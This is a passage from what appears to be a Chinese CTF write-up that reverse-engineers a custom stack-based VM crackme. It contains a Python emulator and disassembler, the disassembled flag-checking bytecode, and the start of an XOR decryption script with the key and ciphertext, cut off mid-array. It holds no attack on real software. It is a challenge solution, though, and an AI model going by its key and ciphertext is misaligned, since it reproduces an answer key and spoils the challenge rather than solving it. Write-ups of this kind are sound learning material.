EOFError:</span><br><span class="line">            user_input = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        data_index = self.get_data_addr(offset)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入数据内存，并添加 null 终止符</span></span><br><span class="line">        encoded_input = user_input.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(encoded_input):</span><br><span class="line">            <span class="keyword">if</span> data_index + i &lt; <span class="built_in">len</span>(self.data_memory):</span><br><span class="line">                self.data_memory[data_index + i] = byte</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入 null 终止符</span></span><br><span class="line">        <span class="keyword">if</span> data_index + <span class="built_in">len</span>(encoded_input) &lt; <span class="built_in">len</span>(self.data_memory):</span><br><span class="line">            self.data_memory[data_index + <span class="built_in">len</span>(encoded_input)] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">puts_sim</span>(<span class="params">self, offset: <span class="built_in">int</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模拟 puts(data + offset)&quot;&quot;&quot;</span></span><br><span class="line">        data_index = self.get_data_addr(offset)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 找到 null 终止符</span></span><br><span class="line">            null_index = self.data_memory.index(<span class="number">0</span>, data_index)</span><br><span class="line">            output = self.data_memory[data_index:null_index].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="comment"># 找不到 null 终止符</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[Error] String at <span class="subst">&#123;<span class="built_in">hex</span>(offset)&#125;</span> is not null-terminated.&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[Error] Offset <span class="subst">&#123;<span class="built_in">hex</span>(offset)&#125;</span> out of bounds.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- VM 实现 ---</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VM</span>:</span><br><span class="line">    OPCODE_MAP: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="type">Optional</span>[<span class="built_in">int</span>], <span class="built_in">str</span>]] = &#123;</span><br><span class="line">        <span class="comment"># Opcode: (Name, Operand Count, Description)</span></span><br><span class="line">        <span class="number">0x101</span>: (<span class="string">&quot;ADD&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Y, Pop X, Push X + Y&quot;</span>),</span><br><span class="line">        <span class="number">0x102</span>: (<span class="string">&quot;AND&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Y, Pop X, Push X &amp; Y&quot;</span>),</span><br><span class="line">        <span class="number">0x103</span>: (<span class="string">&quot;PRINTS_TERM&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Call puts_Terminated()&quot;</span>),</span><br><span class="line">        <span class="number">0x104</span>: (<span class="string">&quot;PUSH_CONST&quot;</span>, <span class="number">1</span>, <span class="string">&quot;Push next word (Immediate)&quot;</span>),</span><br><span class="line">        <span class="number">0x105</span>: (<span class="string">&quot;READ_INT&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Read int from stdin, Push&quot;</span>),</span><br><span class="line">        <span class="number">0x201</span>: (<span class="string">&quot;SUB&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Y, Pop X, Push X - Y&quot;</span>),</span><br><span class="line">        <span class="number">0x202</span>: (<span class="string">&quot;OR&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Y, Pop X, Push X | Y&quot;</span>),</span><br><span class="line">        <span class="number">0x203</span>: (<span class="string">&quot;JMP&quot;</span>, <span class="number">1</span>, <span class="string">&quot;IP = Immediate &gt;&gt; 2 (Unconditional Jump)&quot;</span>),</span><br><span class="line">        <span class="number">0x204</span>: (<span class="string">&quot;POP&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop and discard value&quot;</span>),</span><br><span class="line">        <span class="number">0x205</span>: (<span class="string">&quot;PRINT_INT&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop, Print as integer&quot;</span>),</span><br><span class="line">        <span class="number">0x301</span>: (<span class="string">&quot;INC&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop X, Push X + 1&quot;</span>),</span><br><span class="line">        <span class="number">0x302</span>: (<span class="string">&quot;NOT&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop X, Push ~X&quot;</span>),</span><br><span class="line">        <span class="number">0x303</span>: (<span class="string">&quot;JMPZ&quot;</span>, <span class="number">1</span>, <span class="string">&quot;Pop C, If C == 0, IP = Immediate &gt;&gt; 2&quot;</span>),</span><br><span class="line">        <span class="number">0x304</span>: (<span class="string">&quot;LOAD_DWORD&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Offset, Push *(_DWORD *)(data + Offset)&quot;</span>),</span><br><span class="line">        <span class="number">0x305</span>: (<span class="string">&quot;READ_STR&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Offset, gets(data + Offset)&quot;</span>),</span><br><span class="line">        <span class="number">0x401</span>: (<span class="string">&quot;DEC&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop X, Push X - 1&quot;</span>),</span><br><span class="line">        <span class="number">0x402</span>: (<span class="string">&quot;XOR&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Y, Pop X, Push X ^ Y&quot;</span>),</span><br><span class="line">        <span class="number">0x403</span>: (<span class="string">&quot;JMPNZ&quot;</span>, <span class="number">1</span>, <span class="string">&quot;Pop C, If C != 0, IP = Immediate &gt;&gt; 2&quot;</span>),</span><br><span class="line">        <span class="number">0x404</span>: (</span><br><span class="line">            <span class="string">&quot;STORE_DWORD&quot;</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;Pop Value, Pop Offset, *(_DWORD *)(data + Offset) = Value&quot;</span>,</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x405</span>: (<span class="string">&quot;PRINTS_MEM&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Offset, puts(data + Offset)&quot;</span>),</span><br><span class="line">        <span class="number">0x504</span>: (<span class="string">&quot;LOAD_BYTE&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Pop Offset, Push *(unsigned __int8 *)(data + Offset)&quot;</span>),</span><br><span class="line">        <span class="number">0x604</span>: (</span><br><span class="line">            <span class="string">&quot;STORE_BYTE&quot;</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;Pop Value, Pop Offset, *(_BYTE *)(data + Offset) = Value&quot;</span>,</span><br><span class="line">        ),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bytecode: <span class="type">List</span>[<span class="built_in">int</span>], data_base_addr: <span class="built_in">int</span></span>):</span><br><span class="line">        self.text = bytecode</span><br><span class="line">        self.env = VMEnvironment()</span><br><span class="line">        self.env.data_base_addr = (</span><br><span class="line">            data_base_addr  <span class="comment"># 确保 data_base_addr 与 VMEnvironment 匹配</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 虚拟机反汇编器 ---</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">disassemble</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将字节码转换为汇编指令列表&quot;&quot;&quot;</span></span><br><span class="line">        disassembly_output = []</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> ip &lt; <span class="built_in">len</span>(self.text):</span><br><span class="line">            opcode = self.text[ip]</span><br><span class="line">            info = self.OPCODE_MAP.get(opcode)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> info:</span><br><span class="line">                name, operands, _ = info</span><br><span class="line">                instruction_addr = ip * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 处理操作数 (Immediate)</span></span><br><span class="line">                <span class="keyword">if</span> operands == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">if</span> ip + <span class="number">1</span> &lt; <span class="built_in">len</span>(self.text):</span><br><span class="line">                        operand = self.text[ip + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># 特殊处理跳转指令</span></span><br><span class="line">                        <span class="keyword">if</span> name <span class="keyword">in</span> [<span class="string">&quot;JMP&quot;</span>, <span class="string">&quot;JMPZ&quot;</span>, <span class="string">&quot;JMPNZ&quot;</span>]:</span><br><span class="line">                            target_ip = operand &gt;&gt; <span class="number">2</span></span><br><span class="line">                            asm = <span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;target_ip:X&#125;</span>h (0x<span class="subst">&#123;operand:X&#125;</span>)&quot;</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            asm = <span class="string">f&quot;<span class="subst">&#123;name&#125;</span> 0x<span class="subst">&#123;operand:X&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">                        disassembly_output.append(</span><br><span class="line">                            <span class="string">f&quot;0x<span class="subst">&#123;instruction_addr:08X&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>: <span class="subst">&#123;asm&#125;</span>&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                        ip += <span class="number">2</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        disassembly_output.append(</span><br><span class="line">                            <span class="string">f&quot;0x<span class="subst">&#123;instruction_addr:08X&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>: <span class="subst">&#123;name&#125;</span> [MISSING OPERAND]&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                        ip += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 零操作数指令 (Stack operations)</span></span><br><span class="line">                    asm = name</span><br><span class="line">                    disassembly_output.append(</span><br><span class="line">                        <span class="string">f&quot;0x<span class="subst">&#123;instruction_addr:08X&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>: <span class="subst">&#123;asm&#125;</span>&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                disassembly_output.append(</span><br><span class="line">                    <span class="string">f&quot;0x<span class="subst">&#123;ip*<span class="number">4</span>:08X&#125;</span> <span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>: DATA/UNKNOWN <span class="subst">&#123;<span class="built_in">hex</span>(opcode)&#125;</span>&quot;</span></span><br><span class="line">                )</span><br><span class="line">                ip += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(disassembly_output)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 虚拟机执行器 (用于演示，未实现全部功能) ---</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, max_steps=<span class="number">10000</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行虚拟机代码，仅实现部分关键逻辑以供演示&quot;&quot;&quot;</span></span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        steps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="number">0</span> &lt;= ip &lt; <span class="built_in">len</span>(self.text) <span class="keyword">and</span> steps &lt; max_steps:</span><br><span class="line">            opcode = self.text[ip]</span><br><span class="line">            _ip_value = ip + <span class="number">1</span></span><br><span class="line">            steps += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 使用 try/except 处理栈不足的情况</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 只有少数关键指令被实现，用于演示核心循环逻辑</span></span><br><span class="line">                <span class="keyword">if</span> opcode == <span class="number">0x104</span>:  <span class="comment"># PUSH_CONST</span></span><br><span class="line">                    v6 = self.text[_ip_value]</span><br><span class="line">                    ip = _ip_value + <span class="number">1</span></span><br><span class="line">                    self.env.push(v6)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x304</span>:  <span class="comment"># LOAD_DWORD</span></span><br><span class="line">                    offset = self.env.pop()</span><br><span class="line">                    data_index = self.env.get_data_addr(offset)</span><br><span class="line">                    <span class="comment"># 模拟读取 4 字节 DWORD</span></span><br><span class="line">                    v19 = self.text[</span><br><span class="line">                        data_index // <span class="number">4</span></span><br><span class="line">                    ]  <span class="comment"># 假设 data_memory 也是 4 字节对齐的字列表</span></span><br><span class="line">                    self.env.push(v19)</span><br><span class="line">                    ip = _ip_value  <span class="comment"># Next Opcode</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x301</span>:  <span class="comment"># INC</span></span><br><span class="line">                    v19 = self.env.pop() + <span class="number">1</span></span><br><span class="line">                    self.env.push(v19)</span><br><span class="line">                    ip = _ip_value</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x404</span>:  <span class="comment"># STORE_DWORD</span></span><br><span class="line">                    v16 = self.env.pop()  <span class="comment"># Offset</span></span><br><span class="line">                    value = self.env.pop()  <span class="comment"># Value</span></span><br><span class="line"></span><br><span class="line">                    data_index = self.env.get_data_addr(v16)</span><br><span class="line">                    <span class="comment"># 模拟写入 4 字节 DWORD</span></span><br><span class="line">                    self.text[data_index // <span class="number">4</span>] = value  <span class="comment"># 简化处理，直接写回 text 数组</span></span><br><span class="line">                    ip = _ip_value</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x203</span>:  <span class="comment"># JMP</span></span><br><span class="line">                    jump_target_word = self.text[_ip_value]</span><br><span class="line">                    ip = jump_target_word &gt;&gt; <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> opcode == <span class="number">0x403</span>:  <span class="comment"># JMPNZ</span></span><br><span class="line">                    jump_target_word = self.text[_ip_value]</span><br><span class="line">                    ip = _ip_value + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> self.env.pop() != <span class="number">0</span>:</span><br><span class="line">                        ip = jump_target_word &gt;&gt; <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># --- 其他指令未实现，仅处理 IP 递增 ---</span></span><br><span class="line">                <span class="comment"># 假设所有单字 Opcode 都有 break (除 fall-through 案例外)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    info = self.OPCODE_MAP.get(opcode)</span><br><span class="line">                    <span class="keyword">if</span> info <span class="keyword">and</span> info[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">                        ip += <span class="number">2</span>  <span class="comment"># Skip Opcode and Operand</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        ip += <span class="number">1</span>  <span class="comment"># Skip Opcode</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n[EXECUTION ERROR] <span class="subst">&#123;e&#125;</span> at instruction <span class="subst">&#123;<span class="built_in">hex</span>(ip*<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nExecution finished after <span class="subst">&#123;steps&#125;</span> steps.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 运行示例 ---</span></span><br><span class="line"><span class="comment"># 假设的字节码 (来自您之前提供的列表)</span></span><br><span class="line">vm_bytecode = [</span><br><span class="line">    <span class="comment"># 0x00408254</span></span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x118</span>,</span><br><span class="line">    <span class="number">0x305</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x404</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x2F</span>,</span><br><span class="line">    <span class="comment"># 0x0040827C</span></span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x201</span>,</span><br><span class="line">    <span class="number">0x303</span>,</span><br><span class="line">    <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="comment"># 0x004082A4</span></span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x101</span>,</span><br><span class="line">    <span class="number">0x504</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x7</span>,</span><br><span class="line">    <span class="comment"># 0x004082CC</span></span><br><span class="line">    <span class="number">0x102</span>,</span><br><span class="line">    <span class="number">0x101</span>,</span><br><span class="line">    <span class="number">0x504</span>,</span><br><span class="line">    <span class="number">0x402</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x118</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x101</span>,</span><br><span class="line">    <span class="comment"># 0x004082F4</span></span><br><span class="line">    <span class="number">0x504</span>,</span><br><span class="line">    <span class="number">0x201</span>,</span><br><span class="line">    <span class="number">0x403</span>,</span><br><span class="line">    <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x301</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="comment"># 0x0040831C</span></span><br><span class="line">    <span class="number">0x404</span>,</span><br><span class="line">    <span class="number">0x203</span>,</span><br><span class="line">    <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    <span class="number">0x304</span>,</span><br><span class="line">    <span class="number">0x201</span>,</span><br><span class="line">    <span class="number">0x403</span>,</span><br><span class="line">    <span class="comment"># 0x00408344</span></span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x218</span>,</span><br><span class="line">    <span class="number">0x405</span>,</span><br><span class="line">    <span class="number">0x103</span>,</span><br><span class="line">    <span class="number">0x104</span>,</span><br><span class="line">    <span class="number">0x21C</span>,</span><br><span class="line">    <span class="number">0x405</span>,</span><br><span class="line">    <span class="number">0x103</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 data 内存的起始地址（来自汇编代码的 .data:00408254 附近的引用）</span></span><br><span class="line"><span class="comment"># 这里我们假设 data_base_addr 只是一个逻辑地址，比如 0x1000</span></span><br><span class="line">DATA_BASE_ADDR_SIMULATION = <span class="number">0x1000</span></span><br><span class="line">VM_START_ADDR = <span class="number">0x408254</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 创建和反汇编 VM ---</span></span><br><span class="line">my_vm = VM(vm_bytecode, DATA_BASE_ADDR_SIMULATION)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_vm.disassemble())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反汇编结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0x00000000 0x104: PUSH_CONST 0x118</span><br><span class="line">0x00000008 0x305: READ_STR</span><br><span class="line">0x0000000C 0x104: PUSH_CONST 0x0</span><br><span class="line">0x00000014 0x104: PUSH_CONST 0x0</span><br><span class="line">0x0000001C 0x404: STORE_DWORD</span><br><span class="line">0x00000020 0x104: PUSH_CONST 0x2F</span><br><span class="line">0x00000028 0x104: PUSH_CONST 0x0</span><br><span class="line">0x00000030 0x304: LOAD_DWORD</span><br><span class="line">0x00000034 0x201: SUB</span><br><span class="line">0x00000038 0x303: JMPZ 35h (0xD4)</span><br><span class="line">0x00000040 0x104: PUSH_CONST 0x18</span><br><span class="line">0x00000048 0x104: PUSH_CONST 0x0</span><br><span class="line">0x00000050 0x304: LOAD_DWORD</span><br><span class="line">0x00000054 0x101: ADD</span><br><span class="line">0x00000058 0x504: LOAD_BYTE</span><br><span class="line">0x0000005C 0x104: PUSH_CONST 0x10</span><br><span class="line">0x00000064 0x104: PUSH_CONST 0x0</span><br><span class="line">0x0000006C 0x304: LOAD_DWORD</span><br><span class="line">0x00000070 0x104: PUSH_CONST 0x7</span><br><span class="line">0x00000078 0x102: AND</span><br><span class="line">0x0000007C 0x101: ADD</span><br><span class="line">0x00000080 0x504: LOAD_BYTE</span><br><span class="line">0x00000084 0x402: XOR</span><br><span class="line">0x00000088 0x104: PUSH_CONST 0x118</span><br><span class="line">0x00000090 0x104: PUSH_CONST 0x0</span><br><span class="line">0x00000098 0x304: LOAD_DWORD</span><br><span class="line">0x0000009C 0x101: ADD</span><br><span class="line">0x000000A0 0x504: LOAD_BYTE</span><br><span class="line">0x000000A4 0x201: SUB</span><br><span class="line">0x000000A8 0x403: JMPNZ 35h (0xD4)</span><br><span class="line">0x000000B0 0x104: PUSH_CONST 0x0</span><br><span class="line">0x000000B8 0x304: LOAD_DWORD</span><br><span class="line">0x000000BC 0x301: INC</span><br><span class="line">0x000000C0 0x104: PUSH_CONST 0x0</span><br><span class="line">0x000000C8 0x404: STORE_DWORD</span><br><span class="line">0x000000CC 0x203: JMP 8h (0x20)</span><br><span class="line">0x000000D4 0x104: PUSH_CONST 0x2F</span><br><span class="line">0x000000DC 0x104: PUSH_CONST 0x0</span><br><span class="line">0x000000E4 0x304: LOAD_DWORD</span><br><span class="line">0x000000E8 0x201: SUB</span><br><span class="line">0x000000EC 0x403: JMPNZ 41h (0x104)</span><br><span class="line">0x000000F4 0x104: PUSH_CONST 0x218</span><br><span class="line">0x000000FC 0x405: PRINTS_MEM</span><br><span class="line">0x00000100 0x103: PRINTS_TERM</span><br><span class="line">0x00000104 0x104: PUSH_CONST 0x21C</span><br><span class="line">0x0000010C 0x405: PRINTS_MEM</span><br><span class="line">0x00000110 0x103: PRINTS_TERM</span><br></pre></td></tr></table></figure>
<p>AI反编译一下，
0x10偏移处是8字节的异或密钥，0x18处是47字节的密文，解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --- 替换为您的实际十六进制数据 ---</span></span><br><span class="line"><span class="comment"># 警告：以下数据为示例，需要替换为您通过逆向工程获取的实际 data 内存内容！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyData_2: 循环密钥，位于 data_base + 0x10，长度为 8 字节 (i &amp; 7)</span></span><br><span class="line"><span class="comment"># 格式: [0x??, 0x??, 0x??, 0x??, 0x??, 0x??, 0x??, 0x??]</span></span><br><span class="line">KEY_DATA_2 = [<span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x4D</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># KeyData_1: 主密钥，位于 data_base + 0x18，长度为 47 字节 (Expected_LEN)</span></span><br><span class="line"><span class="comment"># 格式: [0x??, 0x??, 0x??, 0x??, ..., 0x??] (共 47 个字节)</span></span><br><span class="line">KEY_DATA_1 = [</span><br><span class="line">    <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0x0E</span>,</span><br><span class="line">    <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x5B</span>,</span><br><span class="line">    <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x42</span>,</span><br><span class="line">    <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x5B</span>,</span><br><span class="line">    <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x4C</span>,</span><br><span class="line">    <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x58</span>,</span><br><span class="line">    <span class="number">0x58</span>,</span><br><span class="line">    <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x43</span>,</span><br><span class="line">    <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x00</span>,</span><br><span 